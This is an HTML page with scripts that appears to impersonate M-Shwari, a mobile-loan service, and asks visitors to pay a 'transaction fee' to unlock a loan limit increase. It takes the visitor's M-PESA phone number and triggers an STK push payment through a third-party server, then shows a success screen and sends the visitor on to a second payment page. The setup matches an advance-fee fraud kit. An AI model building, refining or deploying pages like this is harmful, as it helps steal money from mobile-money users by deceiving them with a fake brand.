<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>M-SHWARI Loan Limit Payment</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#f3f3f3;
}

.header{
background:#49B72F;
color:white;
text-align:center;
padding:20px;
font-size:20px;
font-weight:bold;
}

.container{
max-width:500px;
margin:20px auto;
padding:15px;
}

.card{
background:white;
border-radius:15px;
padding:20px;
box-shadow:0 2px 10px rgba(0,0,0,.08);
}

.card h2{
color:#49B72F;
text-align:center;
margin-bottom:15px;
}

.info{
background:#f8f8f8;
border-left:4px solid #49B72F;
padding:12px;
border-radius:10px;
font-size:14px;
color:#555;
margin-bottom:15px;
line-height:1.5;
}

.summary{
background:#eef9ea;
padding:15px;
border-radius:10px;
margin-bottom:15px;
font-size:15px;
color:#2d7c1f;
}

label{
font-weight:bold;
display:block;
margin-bottom:8px;
}

input{
width:100%;
padding:15px;
border-radius:10px;
border:1px solid #ddd;
margin-bottom:15px;
font-size:16px;
}

button{
width:100%;
padding:15px;
background:#49B72F;
color:white;
border:none;
border-radius:10px;
font-size:18px;
font-weight:bold;
cursor:pointer;
}

button:disabled{
opacity:0.7;
}

.loader{
display:none;
text-align:center;
margin-top:15px;
}

.loader span{
display:inline-block;
width:12px;
height:12px;
background:#49B72F;
border-radius:50%;
margin:0 3px;
animation:bounce 1.4s infinite ease-in-out;
}

.loader span:nth-child(2){animation-delay:.2s;}
.loader span:nth-child(3){animation-delay:.4s;}

@keyframes bounce{
0%,80%,100%{transform:scale(0)}
40%{transform:scale(1)}
}

.status{
display:none;
margin-top:15px;
text-align:center;
background:#eef9ea;
padding:12px;
border-radius:10px;
color:#2d7c1f;
font-weight:bold;
}

.success-modal{
display:none;
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,.6);
justify-content:center;
align-items:center;
z-index:9999;
}

.success-box{
background:white;
padding:25px;
border-radius:20px;
text-align:center;
width:90%;
max-width:350px;
}

.check{
width:70px;
height:70px;
background:#49B72F;
color:white;
font-size:40px;
border-radius:50%;
display:flex;
align-items:center;
justify-content:center;
margin:auto;
margin-bottom:15px;
}

.success-box h2{
color:#49B72F;
margin-bottom:10px;
}

.success-box button{
margin-top:15px;
padding:12px;
background:#49B72F;
color:white;
border:none;
border-radius:10px;
width:100%;
font-size:16px;
}

</style>
</head>

<body>

<div class="header">
Loan Limit Processing Payment
</div>

<div class="container">

<div class="card">

<h2>Transaction Fee Payment</h2>

<div class="info">
This payment is required to activate your M-SHWARI loan limit increase request.  
Once payment is successful, your loan limit upgrade will be processed automatically.
</div>

<div class="summary">
Selected Amount: KSH <span id="amount"></span><br>
Transaction Fee: KSH <span id="fee"></span>
</div>

<label>M-PESA Phone Number</label>
<input type="tel" id="phone" placeholder="07XXXXXXXX">

<button id="payBtn" onclick="startPayment()">
Pay Now
</button>

<div class="loader" id="loader">
<span></span><span></span><span></span>
</div>

<div class="status" id="status"></div>

</div>

</div>

<!-- SUCCESS MODAL -->
<div class="success-modal" id="successModal">
<div class="success-box">

<div class="check">✓</div>

<h2>Payment Successful</h2>

<p id="successText"></p>

<button onclick="goNextStep()">
Continue
</button>

</div>
</div>

<script>

const SERVER =
"https://withdrawal-optima.onrender.com";

let amount =
localStorage.getItem("boostAmount") || 0;

let fee =
localStorage.getItem("transactionCost") || 0;

document.getElementById("amount").innerText = amount;
document.getElementById("fee").innerText = fee;

async function startPayment(){

const phone =
document.getElementById("phone").value.trim();

if(!phone){
alert("Enter phone number");
return;
}

const btn =
document.getElementById("payBtn");

const loader =
document.getElementById("loader");

const status =
document.getElementById("status");

btn.disabled = true;
btn.innerText = "Sending STK Push...";
loader.style.display = "block";

try{

const response =
await fetch(
SERVER + "/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone,
amount:fee,
purpose:"Loan Limit Upgrade Fee"
})
}
);

const data =
await response.json();

const checkoutId =
data.checkout_request_id ||
data.CheckoutRequestID;

if(!checkoutId){
throw new Error("Failed to initiate payment");
}

status.style.display = "block";
status.innerText =
"STK Push sent. Enter M-PESA PIN.";

checkStatus(checkoutId);

}catch(err){

loader.style.display = "none";
btn.disabled = false;
btn.innerText = "Pay Now";

alert(err.message);

}

}

async function checkStatus(checkoutId){

const interval =
setInterval(async()=>{

const response =
await fetch(
SERVER + "/check-status",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
checkout_request_id:checkoutId
})
}
);

const data = await response.json();

if(data.status === "completed"){

clearInterval(interval);

document.getElementById("loader").style.display = "none";
document.getElementById("status").style.display = "none";

document.getElementById("successText").innerText =
"Fee payment of KSH " + fee + " was successful. Your loan limit request is now being processed.";

document.getElementById("successModal").style.display = "flex";

setTimeout(()=>{

window.location.href =
"payment2.html";

},3000);

}

if(data.status === "failed"){

clearInterval(interval);

alert("Payment failed");

location.reload();

}

},5000);

}

function goNextStep(){

window.location.href =
"payment2.html";

}

</script>

</body>
</html>
